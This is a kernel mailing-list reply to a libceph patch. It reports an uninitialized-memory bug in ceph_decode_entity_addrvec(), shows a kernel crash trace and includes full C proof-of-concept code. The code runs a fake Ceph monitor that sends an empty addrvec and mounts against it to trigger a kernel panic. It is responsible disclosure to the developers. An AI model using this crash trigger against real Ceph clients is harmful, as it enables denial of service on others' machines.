Received: from out203-205-221-173.mail.qq.com (out203-205-221-173.mail.qq.com [203.205.221.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 28E351E5207;
	Sun, 21 Jun 2026 01:29:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782005364; cv=none; b=ux6JcS5NqvrFN7PVzuEvDGxuszbkLm7HOC7W9nqizA4AQS5qoRK+dh/PgQsjhm7avy8Wj2hpcBqEJGIxUxiWKOjvuRaFoi6/eq0KuR9e29/SjFxTGGp3wfJYSLEtAbdFNOr3VfKddfpciehHkqT0jgHhkKqTzlrXL8UmvVYUCWo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782005364; c=relaxed/simple;
	bh=7vSR9MtcIETZdxhsBujmGmOJ3UViigO85P60f+gr4OY=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=AoH2jEv5zDmy7qvb4rYpKGroZ+iinSFOx/r7dDsEyCeazEGaqRlTfg6LNAyLvQnjdcU7sb+sfTlxYkhS74rRZcvMxXUIr2M7XOhzX8QsKIPwQk85+i8/R04Lf2vrQqubq09kfhLt7gFtrGLOGWcP0VOpjdqq4w4HbAgoupzNN4c=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=i0+Nli1r; arc=none smtp.client-ip=203.205.221.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="i0+Nli1r"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782005358; bh=rXlw7dStyD05RaG7tRfmNA26QT0WdIUeXng8xGQGLUo=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=i0+Nli1r5XBbaDQ9paUveXelC7dtOjs8MkYhPWj6tj+1kDgjM0hWBp2eDiAXr819r
	 vlQMZuc1bZB1esEKytO0ZFKtIa5UHeO23mYrVeqDuAn3dbQKT45k/zuAPwOwprwKGp
	 te7M4mVsY5dhHRz5u60O+xl9YYCDnfbHovgGUDHU=
Received: from [192.168.1.100] ([183.94.22.181])
	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
	id 7509B4E8; Sun, 21 Jun 2026 09:29:16 +0800
X-QQ-mid: xmsmtpt1782005356tchkuuzgh
Message-ID: <tencent_3A900D10F5E1841A0950F6CAA67897936D09@qq.com>
X-QQ-XMAILINFO: M+bnqzsRFPImh2BsTP2qWv5a7v47aEY0x/Atgpmm44THJpIbg3jNPR/8Dnlu3p
	 6DydG38Muda2C0bSfaXG3o8es8eVC755iClDEGdCiKS20F4SFswILeJGXR5vpB2/tiSe1LaUtXOa
	 CldUT5pdnnQjCM0MnSna1nqmNntbo9OF08c0cxJHiHLEFP5lExgjiyyIcKjhblRLERKZXeQuJ8tu
	 wpxQNEIrsLGMEjnxU3YeIHk+aa8rAWq10uB+SwXx2KJC0jxxVc9G431bhRxsy0PU/KV+4JmR9M/d
	 yns5TlF3QgoWCoTTQCrjO3dwwMEmBx3a1ptBVuMmie+Wai4rxmnwJB5EhWbvc7Fd6O46NjrZPB6Z
	 lw5aUejw7MRYMxvLcoQwvgnschqzmad7pF+89DgSqR0iBtAQk4RJTaynK+aXMMejdmi0hI8j5Cmb
	 u8FFAtp4KtPaE82W6t+wB4FFx8bG+hZ8keFSJS/832XPHWKJfGubX8wZPnvSNeuzn2IbQf/lFJ8c
	 LkBRixvZ/9jxd/KPd21u5dV2DinseYUyL9bGjrmFSLGonoL7MfuGISOtrRa9I7PmLcj9txOGXyRC
	 2JHQfc/D75FJXWOY4jdbjpMh8VraBnDQ2ETqro65+uMWv5Ztzm3huBhH705PN0YwyekBONdbK4gk
	 c6R3YxCUbRqc3uor/uoRfGFKqfv5LlmDCyCTnNbd47KBNyzJSTyUcAmeTjOVXAm3lLSM8Zp2ncay
	 Fw3wG2FyCQQBUP2sHxxVsnhWs+P6Q472qEB6+Te0SCybWVXoWOd38oCMJY5XJhe2TBrilnKKERSL
	 KnRsL8zY/2n19zOvTJfhchxYww7nDn6aFi46h3XwOmSTMOucXQKmTQkldmB0h9RNzuFBn4AviGdX
	 gT8xNOKXGaNFQfA2QXm3KtiAyEu1okJivkzT0xxjI3Vblfamcnwh5kZaBSyWDinROswi00pFFtD7
	 yj8vRPaOVdYw+W2M/xd+MqIK2KyAnOTMRjuXvvo24JThpxLdSRkqvWDfL/m7+IKbVuNt4/7eBjyt
	 gB106u4+Ye0b27dy7DNyazmBWRNqNMCl5fqrWhK1Zm8TCgWgBR8jOsiMNDb+s=
X-QQ-XMRINFO: Nq+8W0+stu50tPAe92KXseR0ZZmBTk3gLg==
X-OQ-MSGID: <6187a6e1-4995-4d0f-94a3-286b7be3d0aa@qq.com>
Date: Sun, 21 Jun 2026 09:29:16 +0800
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3] libceph: tolerate addrvecs with multiple entries of
 the same type
To: Kefu Chai <k.chai@proxmox.com>, ceph-devel@vger.kernel.org
Cc: Ilya Dryomov <idryomov@gmail.com>, Alex Markuze <amarkuze@redhat.com>,
 Viacheslav Dubeyko <slava@dubeyko.com>, linux-kernel@vger.kernel.org
References: <20260604140231.2759025-1-k.chai@proxmox.com>
 <20260611113251.2975975-1-k.chai@proxmox.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260611113251.2975975-1-k.chai@proxmox.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Kefu,

I came across a Sashiko AI code review [1] that flagged a pre-existing
uninitialized memory issue in `ceph_decode_entity_addrvec()`.  When the
addrvec has zero entries (`addr_cnt == 0`), the function returns 0
without writing to `*addr`, but callers like `ceph_monmap_decode()`
pass addresses from `kmalloc_flex()` and proceed to use them.

I was able to reproduce this in QEMU by running a fake Ceph monitor that
sends a monmap with an empty addrvec.  With `panic_on_warn=1`, the
kernel hits a WARNING in `ceph_con_v1_try_read()` and panics.

On Thu, Jun 11, 2026 at 07:32:51PM +0800, Kefu Chai wrote:
 > ceph_decode_entity_addrvec() currently rejects any addrvec containing
 > more than one entry that matches the requested msgr type...

Your patch correctly tolerates duplicate entries, but the function still
returns success without touching `*addr` when `addr_cnt == 0`:

```c
// net/ceph/decode.c: ceph_decode_entity_addrvec()
if (!addr_cnt)
     return 0;  // *addr is still uninitialized
if (addr_cnt == 1 && !memchr_inv(&tmp_addr, 0, sizeof(tmp_addr)))
     return 0;  // same
```

Callers that pass addresses from dynamic allocation hit stale data:

```c
// net/ceph/mon_client.c: ceph_monmap_decode()
mon_inst = kmalloc_flex(..., num_mon, sizeof(*mon_inst));
// ...
ceph_decode_entity_addrvec(p, end, msgr2, &mon_inst[i].addr);
// mon_inst[i].addr may be uninitialized if addrvec was empty
```

[Reproduction]

I set up a fake Ceph v1 monitor on localhost that sends a monmap
containing a monitor entry with an empty addrvec (addr_cnt=0). Mounting
the Ceph filesystem against it triggers the monmap decode path, causing
the client to attempt a connection with the uninitialized address.

[Crash — kernel 7.1.0-rc6, panic_on_warn=1]

   con->v1.connect_seq != le32_to_cpu(con->v1.in_reply.connect_seq)
   WARNING: net/ceph/messenger_v1.c:901 at 
ceph_con_v1_try_read+0x59f7/0x7020

   RIP: 0010:ceph_con_v1_try_read+0x59f7/0x7020
   Call Trace:
    <TASK>
    ceph_con_workfn+0xa04/0x13c0
    process_one_work+0xa20/0x1c50
    worker_thread+0x6df/0xf30
    kthread+0x387/0x4a0
    ret_from_fork+0xb2c/0xdd0
    </TASK>

   Kernel panic - not syncing: kernel: panic_on_warn set ...

Full PoC source (poc.c):
---8<----------------------------------------------------------------
/*
  * PoC: Uninitialized memory in ceph_decode_entity_addrvec()
  * Compile: gcc -static -o poc poc.c
  * Run: ./poc [port]
  */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/poll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>

#define BANNER "ceph v027"
#define BNR 9
#define ADR 136
#define CBNR (BNR+ADR)
#define SBNR (BNR+2*ADR)

#define TAG_RDY 1
#define TAG_MSG 7
#define MON_MAP 4
#define ENT_MON 1

#define MSZ 16384

typedef uint8_t u8; typedef uint16_t u16;
typedef uint32_t u32; typedef uint64_t u64;

static u32 ct[256];
static int ci;

static void ic(void)
{
     u32 i, j, k;
     if (ci) return;
     for (i = 0; i < 256; i++) {
         k = i;
         for (j = 0; j < 8; j++)
             k = (k >> 1) ^ (k & 1 ? 0x82F63B78 : 0);
         ct[i] = k;
     }
     ci = 1;
}

static u32 crc(u32 c, const u8 *b, int l)
{
     while (l--) c = ct[(c ^ *b++) & 0xFF] ^ (c >> 8);
     return c;
}

#define W8(b,v)  ((b)[0] = (u8)(v))
#define W16(b,v) ((b)[0]=(v)&255,(b)[1]=((v)>>8)&255)
#define W32(b,v) 
((b)[0]=(v)&255,(b)[1]=((v)>>8)&255,(b)[2]=((v)>>16)&255,(b)[3]=((v)>>24)&255)
#define W64(b,v) do { int _i; for (_i=0; _i<8; _i++) 
(b)[_i]=((u64)(v)>>(_i*8))&255; } while(0)

#define REQ_FEAT (1ULL << 23)

static int rcv(int f, u8 *b, int l)
{
     while (l > 0) {
         struct pollfd p = { .fd = f, .events = POLLIN };
         if (poll(&p, 1, 15000) <= 0) return -1;
         int n = read(f, b, l);
         if (n <= 0) return -1;
         b += n; l -= n;
     }
     return 0;
}

static int snd(int f, u8 *b, int l)
{
     while (l > 0) { int n = write(f, b, l); if (n <= 0) return -1; b += 
n; l -= n; }
     return 0;
}

static int ea(u8 *b) { W8(b, 2); W32(b+1, 0); return 5; }

static int pay(u8 *b)
{
     int o = 0, bo, so, po, mo, ms;
     bo = o; W32(b+o, 0); o += 4;
     W8(b+o, 6); o++; W8(b+o, 1); o++;
     so = o; W32(b+o, 0); o += 4;
     po = o;
     W64(b+o, 0x42); o += 8;
     W32(b+o, 1); o += 4;
     W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o += 4;
     W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o += 4;
     W32(b+o, 1); o += 4;
     W32(b+o, 2); o += 4; memcpy(b+o, "m0", 2); o += 2;
     W8(b+o, 1); o++; W8(b+o, 1); o++;
     mo = o; W32(b+o, 0); o += 4;
     ms = o;
     W32(b+o, 2); o += 4; memcpy(b+o, "m0", 2); o += 2;
     o += ea(b+o);
     W32(b+mo, o - ms);
     W32(b+so, o - po);
     W32(b+bo, o - bo);
     return o;
}

#define HS 60
#define FS 13

static int msg(u8 *b, u64 s)
{
     int o = 0;
     b[o++] = TAG_MSG;
     int h = o;
     memset(b+o, 0, HS); o += HS;
     int pl = pay(b+o); o += pl;
     memset(b+o, 0, FS); o += FS;
     u8 *hh = b + h;
     W64(hh+0, s); W16(hh+16, MON_MAP); W16(hh+18, 127);
     W16(hh+20, 1); W32(hh+22, pl); W64(hh+36, ENT_MON);
     W64(hh+44, 0); W32(hh+56, crc(0, hh, 56));
     return o;
}

static int mon(int pt)
{
     int s, c; struct sockaddr_in a; u8 b[MSZ];
     ic();
     s = socket(AF_INET, SOCK_STREAM, 0);
     int o = 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
     memset(&a, 0, sizeof(a)); a.sin_family = AF_INET;
     a.sin_addr.s_addr = htonl(INADDR_LOOPBACK); a.sin_port = htons(pt);
     bind(s, (void *)&a, sizeof(a)); listen(s, 1);
     struct pollfd p = { .fd = s, .events = POLLIN };
     if (poll(&p, 1, 60000) <= 0) goto out;
     c = accept(s, 0, 0);

     if (rcv(c, b, CBNR) < 0) goto done;
     { u8 *p = b; memcpy(p, BANNER, BNR); p += BNR;
       memset(p, 0, ADR); p += ADR; memset(p, 0, ADR);
       if (snd(c, b, SBNR) < 0) goto done; }
     { int t = 0; while (t < 26) {
         struct pollfd p2 = { .fd = c, .events = POLLIN };
         if (poll(&p2, 1, 10000) <= 0) goto done;
         int n = read(c, b+t, MSZ-t); if (n <= 0) goto done; t += n; } }
     memset(b, 0, 26); W8(b, TAG_RDY); W64(b+1, REQ_FEAT);
     snd(c, b, 26); usleep(300000);
     { int ml = msg(b, 1); snd(c, b, ml); }
     usleep(500000);
     { int ml = msg(b, 2); snd(c, b, ml); }
out:
     close(c); close(s); return 0;
done:
     close(c); close(s); return -1;
}

int main(int ac, char **av)
{
     int pt = 16789; if (ac >= 2) pt = atoi(av[1]);
     pid_t pid = fork();
     if (pid == 0) { mon(pt); _exit(0); }
     usleep(200000);
     mkdir("/tmp/mnt", 0700);
     char s[64]; snprintf(s, 64, "127.0.0.1:%d:/", pt);
     mount(s, "/tmp/mnt", "ceph", 0, "name=admin");
     waitpid(pid, 0, 0);
     umount2("/tmp/mnt", MNT_FORCE); rmdir("/tmp/mnt");
     return 0;
}
---8<----------------------------------------------------------------
Compile: gcc -static -o poc poc.c

[1] 
https://sashiko.dev/#/patchset/20260611113251.2975975-1-k.chai%40proxmox.com
     (Sashiko AI code review — "Uninitialized Memory", Severity: High)

Thanks,
XIAOWU


